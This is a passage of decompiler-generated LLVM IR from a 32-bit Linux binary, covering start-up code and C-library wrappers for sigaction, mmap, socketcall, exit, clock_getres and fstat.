  %v3_8051ac7 = load i32, i32* %arg3, align 4
  %v14_8051ac7 = icmp eq i32 %v1_8051abf, %v3_8051ac7
  %v1_8051ac9 = icmp eq i1 %v14_8051ac7, false
  br i1 %v1_8051ac9, label %dec_label_pc_8051ad1, label %dec_label_pc_8051acb

dec_label_pc_8051acb:                             ; preds = %dec_label_pc_8051a85
  store i32 %v3_8051abc, i32* @global_var_80530e8.223, align 8
  br label %dec_label_pc_8051ad1

dec_label_pc_8051ad1:                             ; preds = %dec_label_pc_8051a85, %dec_label_pc_8051acb
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8051ad6 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051adb = bitcast i32* %stack_var_-136 to i8*
  %v4_8051adb = call i32 @function_80500da(i8* %v3_8051adb, i32 0, i32 120)
  %v0_8051ae0 = load i32, i32* @global_var_80530e8.223, align 8
  br label %dec_label_pc_8051ae8

dec_label_pc_8051ae8:                             ; preds = %dec_label_pc_8051ae8, %dec_label_pc_8051ad1
  %v0_8051ae8 = phi i32 [ %v1_8051aeb, %dec_label_pc_8051ae8 ], [ %v0_8051ae0, %dec_label_pc_8051ad1 ]
  %v1_8051ae8 = inttoptr i32 %v0_8051ae8 to i32*
  %v2_8051ae8 = load i32, i32* %v1_8051ae8, align 4
  %v3_8051ae8 = icmp eq i32 %v2_8051ae8, 0
  %v1_8051aeb = add i32 %v0_8051ae8, 4
  %v1_8051aee = icmp eq i1 %v3_8051ae8, false
  br i1 %v1_8051aee, label %dec_label_pc_8051ae8, label %dec_label_pc_8051b0f.preheader

dec_label_pc_8051b0f.preheader:                   ; preds = %dec_label_pc_8051ae8
  store i32 %v1_8051aeb, i32* @ebx, align 4
  %v1_8051b0f22 = inttoptr i32 %v1_8051aeb to i32*
  %v2_8051b0f23 = load i32, i32* %v1_8051b0f22, align 4
  %v3_8051b0f24 = icmp eq i32 %v2_8051b0f23, 0
  %v1_8051b1226 = icmp eq i1 %v3_8051b0f24, false
  br i1 %v1_8051b1226, label %dec_label_pc_8051af4.lr.ph, label %dec_label_pc_8051b14

dec_label_pc_8051af4.lr.ph:                       ; preds = %dec_label_pc_8051b0f.preheader
  %v3_8051ad4 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051aff = add i32 %v3_8051ad4, 32
  br label %dec_label_pc_8051af4

dec_label_pc_8051af4:                             ; preds = %dec_label_pc_8051af4.lr.ph, %dec_label_pc_8051b0c
  %v1_8051aff = phi i32 [ %v2_8051b0f23, %dec_label_pc_8051af4.lr.ph ], [ %v2_8051b0f, %dec_label_pc_8051b0c ]
  %v0_8051afe = phi i32 [ %v1_8051aeb, %dec_label_pc_8051af4.lr.ph ], [ %v1_8051b0c, %dec_label_pc_8051b0c ]
  %v6_8051af9 = icmp ugt i32 %v1_8051aff, 14
  br i1 %v6_8051af9, label %dec_label_pc_8051b0c, label %dec_label_pc_8051afb

dec_label_pc_8051afb:                             ; preds = %dec_label_pc_8051af4
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_8051afe, i32* %stack_var_-168, align 4
  %v2_8051aff = mul i32 %v1_8051aff, 8
  %v4_8051aff = add i32 %v3_8051aff, %v2_8051aff
  %v3_8051b04 = inttoptr i32 %v4_8051aff to i16*
  %v4_8051b04 = call i32 @function_80522d2(i16* %v3_8051b04, i32 %v0_8051afe, i32 8)
  %v0_8051b0c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b0c

dec_label_pc_8051b0c:                             ; preds = %dec_label_pc_8051af4, %dec_label_pc_8051afb
  %v0_8051b0c = phi i32 [ %v0_8051afe, %dec_label_pc_8051af4 ], [ %v0_8051b0c.pre, %dec_label_pc_8051afb ]
  %v1_8051b0c = add i32 %v0_8051b0c, 8
  store i32 %v1_8051b0c, i32* @ebx, align 4
  %v1_8051b0f = inttoptr i32 %v1_8051b0c to i32*
  %v2_8051b0f = load i32, i32* %v1_8051b0f, align 4
  %v3_8051b0f = icmp eq i32 %v2_8051b0f, 0
  %v1_8051b12 = icmp eq i1 %v3_8051b0f, false
  br i1 %v1_8051b12, label %dec_label_pc_8051af4, label %dec_label_pc_8051b14

dec_label_pc_8051b14:                             ; preds = %dec_label_pc_8051b0c, %dec_label_pc_8051b0f.preheader
  store i32 %v2_8051ad6, i32* @eax, align 4
  %v0_8051b18 = call i32 @function_805238d()
  store i32 %v0_8051b18, i32* @eax, align 4
  %v0_8051b1d = call i32 @function_8051a45()
  %v1_8051b26 = icmp eq i32 %tmp39, 0
  %v1_8051b28 = icmp eq i1 %v1_8051b26, false
  br i1 %v1_8051b28, label %dec_label_pc_8051b2e, label %dec_label_pc_8051b2a

dec_label_pc_8051b2a:                             ; preds = %dec_label_pc_8051b14
  %v1_8051b2a = and i32 %tmp39, -65536
  %v2_8051b2a = or i32 %v1_8051b2a, 4096
  br label %dec_label_pc_8051b2e

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051b14, %dec_label_pc_8051b2a
  %v0_8051b2e = phi i32 [ %tmp39, %dec_label_pc_8051b14 ], [ %v2_8051b2a, %dec_label_pc_8051b2a ]
  store i32 %v0_8051b2e, i32* @global_var_80530ec.221, align 4
  %v13_8051b33 = icmp eq i32 %tmp38, -1
  %v1_8051b38 = icmp eq i1 %v13_8051b33, false
  br i1 %v1_8051b38, label %dec_label_pc_8051b63, label %dec_label_pc_8051b3a

dec_label_pc_8051b3a:                             ; preds = %dec_label_pc_8051b2e
  %v0_8051b3a = call i32 @function_80520b1()
  store i32 %v0_8051b3a, i32* @ebx, align 4
  %v0_8051b41 = call i32 @function_8052020()
  %v0_8051b46 = load i32, i32* @ebx, align 4
  %v12_8051b46 = icmp eq i32 %v0_8051b46, %v0_8051b41
  %v1_8051b48 = icmp eq i1 %v12_8051b46, false
  br i1 %v1_8051b48, label %dec_label_pc_8051b79, label %dec_label_pc_8051b4a

dec_label_pc_8051b4a:                             ; preds = %dec_label_pc_8051b3a
  %v0_8051b4a = call i32 @function_8052046()
  store i32 %v0_8051b4a, i32* @ebx, align 4
  %v0_8051b51 = call i32 @function_8051ffa()
  %v0_8051b56 = load i32, i32* @ebx, align 4
  %v12_8051b56 = icmp eq i32 %v0_8051b56, %v0_8051b51
  %v1_8051b58 = icmp eq i1 %v12_8051b56, false
  br i1 %v1_8051b58, label %dec_label_pc_8051b79, label %dec_label_pc_8051b5a.thread

dec_label_pc_8051b5a.thread:                      ; preds = %dec_label_pc_8051b4a
  br label %dec_label_pc_8051ba3

dec_label_pc_8051b63:                             ; preds = %dec_label_pc_8051b2e
  %v15_8051b63 = icmp eq i32 %tmp38, %tmp37
  %v1_8051b67 = icmp eq i1 %v15_8051b63, false
  br i1 %v1_8051b67, label %dec_label_pc_8051b79, label %dec_label_pc_8051b69

dec_label_pc_8051b69:                             ; preds = %dec_label_pc_8051b63
  br label %dec_label_pc_8051b79

dec_label_pc_8051b79:                             ; preds = %dec_label_pc_8051b69, %dec_label_pc_8051b63, %dec_label_pc_8051b4a, %dec_label_pc_8051b3a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051b80 = call i32 @function_8051a11()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051b8f = call i32 @function_8051a11()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051b9e = call i32 @function_8051a11()
  br label %dec_label_pc_8051ba3

dec_label_pc_8051ba3:                             ; preds = %dec_label_pc_8051b5a.thread, %dec_label_pc_8051b79
  store i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32* %esi.global-to-local, align 4
  %v0_8051ba8 = load i32, i32* @edi, align 4
  %v1_8051ba8 = inttoptr i32 %v0_8051ba8 to i32*
  %v2_8051ba8 = load i32, i32* %v1_8051ba8, align 4
  store i32 %v2_8051ba8, i32* bitcast (i32** @global_var_8053084.225 to i32*), align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80530f0.217, align 16
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_8051bc8, label %dec_label_pc_8051bd4

dec_label_pc_8051bc8:                             ; preds = %dec_label_pc_8051ba3, %dec_label_pc_8051bc8
  %v4_8051bc8 = phi i32 [ %v1_8051bcf, %dec_label_pc_8051bc8 ], [ 0, %dec_label_pc_8051ba3 ]
  store i32 ptrtoint (i32* @global_var_8051bcf.226 to i32), i32* %stack_var_-164, align 4
  %v5_8051bc8 = mul i32 %v4_8051bc8, 4
  %v6_8051bc8 = add i32 %v5_8051bc8, ptrtoint (i32* @global_var_8053000.215 to i32)
  %v7_8051bc8 = inttoptr i32 %v6_8051bc8 to i32*
  %v8_8051bc8 = load i32, i32* %v7_8051bc8, align 4
  call void @__pseudo_call(i32 %v8_8051bc8)
  %v0_8051bcf = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bcf = add i32 %v0_8051bcf, 1
  store i32 %v1_8051bcf, i32* %ebx.global-to-local, align 4
  %v1_8051bd0 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051bd0 = icmp ult i32 %v1_8051bcf, %v1_8051bd0
  br i1 %v7_8051bd0, label %dec_label_pc_8051bc8, label %dec_label_pc_8051bd4

dec_label_pc_8051bd4:                             ; preds = %dec_label_pc_8051bc8, %dec_label_pc_8051ba3
  store i32 134552538, i32* %stack_var_-164, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_8051bec, label %dec_label_pc_8051bf8

dec_label_pc_8051bec:                             ; preds = %dec_label_pc_8051bd4, %dec_label_pc_8051bec
  %v4_8051bec = phi i32 [ %v1_8051bf3, %dec_label_pc_8051bec ], [ 0, %dec_label_pc_8051bd4 ]
  store i32 ptrtoint (i32* @global_var_8051bf3.227 to i32), i32* %stack_var_-164, align 4
  %v5_8051bec = mul i32 %v4_8051bec, 4
  %v6_8051bec = add i32 %v5_8051bec, ptrtoint (i32* @global_var_8053000.215 to i32)
  %v7_8051bec = inttoptr i32 %v6_8051bec to i32*
  %v8_8051bec = load i32, i32* %v7_8051bec, align 4
  call void @__pseudo_call(i32 %v8_8051bec)
  %v0_8051bf3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bf3 = add i32 %v0_8051bf3, 1
  store i32 %v1_8051bf3, i32* %ebx.global-to-local, align 4
  %v1_8051bf4 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051bf4 = icmp ult i32 %v1_8051bf3, %v1_8051bf4
  br i1 %v7_8051bf4, label %dec_label_pc_8051bec, label %dec_label_pc_8051bf8

dec_label_pc_8051bf8:                             ; preds = %dec_label_pc_8051bec, %dec_label_pc_8051bd4
  %v0_8051c01 = load i32, i32* %stack_var_-164, align 4
  %v1_8051c01 = call i32 @function_8050089(i32 %v0_8051c01)
  %v1_8051c06 = inttoptr i32 %v1_8051c01 to i32*
  store i32 0, i32* %v1_8051c06, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8051a86)
  %v0_8051c36 = load i32, i32* @eax, align 4
  %v1_8051c39 = call i32 @function_8051699(i32 %v0_8051c36)
  %v0_8051c45 = load i32, i32* @ebx, align 4
  %v1_8051c45 = inttoptr i32 %v0_8051c45 to %sigcontext*
  %v2_8051c45 = call i32 @sigreturn(%sigcontext* %v1_8051c45)
  %v0_8051c4d = load i32, i32* @ebx, align 4
  %v1_8051c4d = inttoptr i32 %v0_8051c4d to %sigcontext*
  %v2_8051c4d = call i32 @sigreturn(%sigcontext* %v1_8051c4d)
  ret i32 %v2_8051c4d

; uselistorder directives
  uselistorder i32 %v1_8051bf3, { 1, 2, 0 }
  uselistorder i32 %v1_8051bcf, { 1, 2, 0 }
  uselistorder i32 %v2_8051b0f, { 1, 0 }
  uselistorder i32 %v1_8051b0c, { 2, 1, 0 }
  uselistorder i32 %v1_8051aeb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051ae8, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8051a11, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 120, { 8, 22, 23, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8051bec, { 1, 0 }
  uselistorder label %dec_label_pc_8051bc8, { 1, 0 }
  uselistorder label %dec_label_pc_8051ba3, { 1, 0 }
  uselistorder label %dec_label_pc_8051b2e, { 1, 0 }
  uselistorder label %dec_label_pc_8051b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8051af4, { 1, 0 }
  uselistorder label %dec_label_pc_8051ad1, { 1, 0 }
}

define i32 @function_8051c4f(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051c4f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051c4f = load i32, i32* @esi, align 4
  %v0_8051c50 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051c65 = icmp eq i32* %arg2, null
  br i1 %v1_8051c65, label %dec_label_pc_8051cb8, label %dec_label_pc_8051c69

dec_label_pc_8051c69:                             ; preds = %dec_label_pc_8051c4f
  %v2_8051c69 = load i32, i32* %arg2, align 4
  store i32 %v2_8051c69, i32* %stack_var_-148, align 4
  %v1_8051c72 = add i32 %tmp11, 4
  %v3_8051c84 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051c84 = call i32 @function_80522d2(i16* %v3_8051c84, i32 %v1_8051c72, i32 128)
  %v1_8051c89 = add i32 %tmp11, 132
  %v2_8051ca3 = inttoptr i32 %v1_8051c89 to i8*
  %v3_8051ca3 = load i8, i8* %v2_8051ca3, align 1
  %v4_8051ca3 = and i8 %v3_8051ca3, 4
  %v5_8051ca3 = icmp eq i8 %v4_8051ca3, 0
  %v1_8051caa = icmp eq i1 %v5_8051ca3, false
  br i1 %v1_8051caa, label %dec_label_pc_8051cb8, label %dec_label_pc_8051cac

dec_label_pc_8051cac:                             ; preds = %dec_label_pc_8051c69
  br label %dec_label_pc_8051cb8

dec_label_pc_8051cb8:                             ; preds = %dec_label_pc_8051cac, %dec_label_pc_8051c69, %dec_label_pc_8051c4f
  %v1_8051cba = icmp eq i32 %arg3, 0
  br i1 %v1_8051cba, label %dec_label_pc_8051cc2, label %dec_label_pc_8051cbe

dec_label_pc_8051cbe:                             ; preds = %dec_label_pc_8051cb8
  %v2_8051cbe = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051cc2

dec_label_pc_8051cc2:                             ; preds = %dec_label_pc_8051cb8, %dec_label_pc_8051cbe
  %v0_8051cd1 = phi i32 [ 0, %dec_label_pc_8051cb8 ], [ %v2_8051cbe, %dec_label_pc_8051cbe ]
  br i1 %v1_8051c65, label %dec_label_pc_8051ccf, label %dec_label_pc_8051cc8

dec_label_pc_8051cc8:                             ; preds = %dec_label_pc_8051cc2
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8051ccf

dec_label_pc_8051ccf:                             ; preds = %dec_label_pc_8051cc2, %dec_label_pc_8051cc8
  %v0_8051cd2 = phi %sigaction* [ null, %dec_label_pc_8051cc2 ], [ %phitmp, %dec_label_pc_8051cc8 ]
  %v5_8051cda = call i32 @function_8051d75(i32 %arg1, %sigaction* %v0_8051cd2, i32 %v0_8051cd1, i32 8)
  store i32 %v5_8051cda, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051cba, label %dec_label_pc_8051d1d, label %dec_label_pc_8051ce8

dec_label_pc_8051ce8:                             ; preds = %dec_label_pc_8051ccf
  %v2_8051ce8 = icmp slt i32 %v5_8051cda, 0
  br i1 %v2_8051ce8, label %dec_label_pc_8051d1d, label %dec_label_pc_8051cec

dec_label_pc_8051cec:                             ; preds = %dec_label_pc_8051ce8
  %v3_8051cec = load i32, i32* %stack_var_-288, align 4
  %v2_8051cf0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051cec, i32* %v2_8051cf0, align 4
  %v2_8051cf8 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051cfd = add i32 %arg3, 4
  %v3_8051d01 = inttoptr i32 %v1_8051cfd to i16*
  %v4_8051d01 = call i32 @function_80522d2(i16* %v3_8051d01, i32 %v2_8051cf8, i32 128)
  %v2_8051d0a = add i32 %arg3, 132
  %v3_8051d0a = inttoptr i32 %v2_8051d0a to i32*
  %v2_8051d17 = add i32 %arg3, 136
  %v3_8051d17 = inttoptr i32 %v2_8051d17 to i32*
  %v0_8051d1d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051d1d

dec_label_pc_8051d1d:                             ; preds = %dec_label_pc_8051ce8, %dec_label_pc_8051ccf, %dec_label_pc_8051cec
  %v0_8051d1d = phi i32 [ %v5_8051cda, %dec_label_pc_8051ce8 ], [ %v5_8051cda, %dec_label_pc_8051ccf ], [ %v0_8051d1d.pre, %dec_label_pc_8051cec ]
  store i32 %v0_8051c50, i32* @ebx, align 4
  store i32 %v0_8051c4f, i32* @esi, align 4
  ret i32 %v0_8051d1d

; uselistorder directives
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 0, 4, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_8051d1d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ccf, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc2, { 1, 0 }
}

define i32 @function_8051d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051d28:
  %stack_var_4 = alloca i32, align 4
  %v0_8051d28 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d28, i32* @edx, align 4
  %v2_8051d33 = load i32, i32* @ecx, align 4
  %v4_8051d33 = load i32, i32* @esi, align 4
  %v5_8051d33 = load i32, i32* @edi, align 4
  %v6_8051d33 = load i32, i32* @ebp, align 4
  %v7_8051d33 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8051d33, i32 %v0_8051d28, i32 %v4_8051d33, i32 %v5_8051d33, i32 %v6_8051d33)
  %v8_8051d33 = ptrtoint i32* %v7_8051d33 to i32
  store i32 %v0_8051d28, i32* @ebx, align 4
  %v3_8051d3c = icmp ugt i32* %v7_8051d33, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8051d3c, i32 134554581)
  ret i32 %v8_8051d33

; uselistorder directives
  uselistorder i32* @ebp, { 4, 40, 41, 42, 43, 44, 45, 46, 47, 5, 6, 7, 8, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 3, 61, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 1, 24, 25, 26, 27, 28, 29, 30, 31, 2, 32, 33, 34, 35, 36, 37, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 80, 81, 83, 84, 85, 86, 87, 38, 39 }
  uselistorder i32* @ecx, { 4, 12, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 1, 39, 15, 14, 13, 40, 41, 42, 2, 43, 44, 45, 3, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 6, 7, 8, 9, 10, 11, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 5, 82, 83, 84, 85 }
}

define i32 @function_8051d43(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051d43:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d43 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d43, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051d56 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051d56, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051d56, -4095
  br i1 %tmp9, label %dec_label_pc_8051d6f, label %dec_label_pc_8051d63

dec_label_pc_8051d63:                             ; preds = %dec_label_pc_8051d43
  %v1_8051d63 = call i32 @function_8050089(i32 %v0_8051d43)
  %v0_8051d68 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d68 = sub i32 0, %v0_8051d68
  %v2_8051d6a = inttoptr i32 %v1_8051d63 to i32*
  store i32 %v1_8051d68, i32* %v2_8051d6a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051d73.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d6f

dec_label_pc_8051d6f:                             ; preds = %dec_label_pc_8051d43, %dec_label_pc_8051d63
  %v2_8051d73 = phi i32 [ %v0_8051d43, %dec_label_pc_8051d43 ], [ %v2_8051d73.pre, %dec_label_pc_8051d63 ]
  %v0_8051d6f = phi i32 [ %v1_8051d56, %dec_label_pc_8051d43 ], [ -1, %dec_label_pc_8051d63 ]
  %v2_8051d71 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d71, i32* @edx, align 4
  store i32 %v2_8051d73, i32* @ebx, align 4
  ret i32 %v0_8051d6f

; uselistorder directives
  uselistorder i32 %v1_8051d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d6f, { 1, 0 }
}

define i32 @function_8051d75(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051d75:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d76 = load i32, i32* @esi, align 4
  store i32 %v0_8051d76, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051d8a = load i32, i32* @ebx, align 4
  %v7_8051d92 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051d92, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8051d92, -4095
  br i1 %tmp14, label %dec_label_pc_8051daa, label %dec_label_pc_8051d9e

dec_label_pc_8051d9e:                             ; preds = %dec_label_pc_8051d75
  %v1_8051d9e = call i32 @function_8050089(i32 %v0_8051d8a)
  %v0_8051da3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051da3 = sub i32 0, %v0_8051da3
  %v2_8051da5 = inttoptr i32 %v1_8051d9e to i32*
  store i32 %v1_8051da3, i32* %v2_8051da5, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051dad.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051daa

dec_label_pc_8051daa:                             ; preds = %dec_label_pc_8051d75, %dec_label_pc_8051d9e
  %v2_8051dad = phi i32 [ %v0_8051d76, %dec_label_pc_8051d75 ], [ %v2_8051dad.pre, %dec_label_pc_8051d9e ]
  %v0_8051daa = phi i32 [ %v7_8051d92, %dec_label_pc_8051d75 ], [ -1, %dec_label_pc_8051d9e ]
  store i32 %v2_8051dad, i32* @esi, align 4
  ret i32 %v0_8051daa

; uselistorder directives
  uselistorder i32 %v7_8051d92, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051daa, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8051db0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8051db0:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8051dd8(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051dd8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051dd8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051dd8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051deb = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051deb, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051deb, -4095
  br i1 %tmp10, label %dec_label_pc_8051e04, label %dec_label_pc_8051df8

dec_label_pc_8051df8:                             ; preds = %dec_label_pc_8051dd8
  %v1_8051df8 = call i32 @function_8050089(i32 %v0_8051dd8)
  %v0_8051dfd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051dfd = sub i32 0, %v0_8051dfd
  %v2_8051dff = inttoptr i32 %v1_8051df8 to i32*
  store i32 %v1_8051dfd, i32* %v2_8051dff, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051e08.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051e04

dec_label_pc_8051e04:                             ; preds = %dec_label_pc_8051dd8, %dec_label_pc_8051df8
  %v2_8051e08 = phi i32 [ %v0_8051dd8, %dec_label_pc_8051dd8 ], [ %v2_8051e08.pre, %dec_label_pc_8051df8 ]
  %v0_8051e04 = phi i32 [ %v4_8051deb, %dec_label_pc_8051dd8 ], [ -1, %dec_label_pc_8051df8 ]
  %v2_8051e06 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051e06, i32* @edx, align 4
  store i32 %v2_8051e08, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051e04

; uselistorder directives
  uselistorder i32 %v4_8051deb, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e04, { 1, 0 }
}

define i32 @function_8051e0a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051e0a:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e0a = load i32, i32* @ebx, align 4
  store i32 %v0_8051e0a, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8051e1d = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8051e1d, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8051e1d, -4095
  br i1 %tmp13, label %dec_label_pc_8051e38, label %dec_label_pc_8051e2a

dec_label_pc_8051e2a:                             ; preds = %dec_label_pc_8051e0a
  %v1_8051e2a = call i32 @function_8050089(i32 %v0_8051e0a)
  %v0_8051e2f = load i32, i32* @ebx, align 4
  %v1_8051e2f = sub i32 0, %v0_8051e2f
  %v2_8051e31 = inttoptr i32 %v1_8051e2a to i32*
  store i32 %v1_8051e2f, i32* %v2_8051e31, align 4
  %v2_8051e50.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051e4b

dec_label_pc_8051e38:                             ; preds = %dec_label_pc_8051e0a
  %v1_8051e38 = icmp eq i32 %v4_8051e1d, 0
  %v1_8051e3a = icmp eq i1 %v1_8051e38, false
  br i1 %v1_8051e3a, label %dec_label_pc_8051e4b, label %dec_label_pc_8051e3c

dec_label_pc_8051e3c:                             ; preds = %dec_label_pc_8051e38
  %v4_8051e43 = bitcast i32* %stack_var_-68 to i16*
  %v5_8051e43 = call i32 @function_8052255(i16* %v4_8051e43, i32 %arg2, i32 %v4_8051e1d, i32 %v4_8051e1d)
  %v0_8051e4b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051e4b

dec_label_pc_8051e4b:                             ; preds = %dec_label_pc_8051e38, %dec_label_pc_8051e2a, %dec_label_pc_8051e3c
  %v2_8051e50 = phi i32 [ %v0_8051e0a, %dec_label_pc_8051e38 ], [ %v2_8051e50.pre, %dec_label_pc_8051e2a ], [ %v0_8051e0a, %dec_label_pc_8051e3c ]
  %v0_8051e4b = phi i32 [ %v4_8051e1d, %dec_label_pc_8051e38 ], [ -1, %dec_label_pc_8051e2a ], [ %v0_8051e4b.pre, %dec_label_pc_8051e3c ]
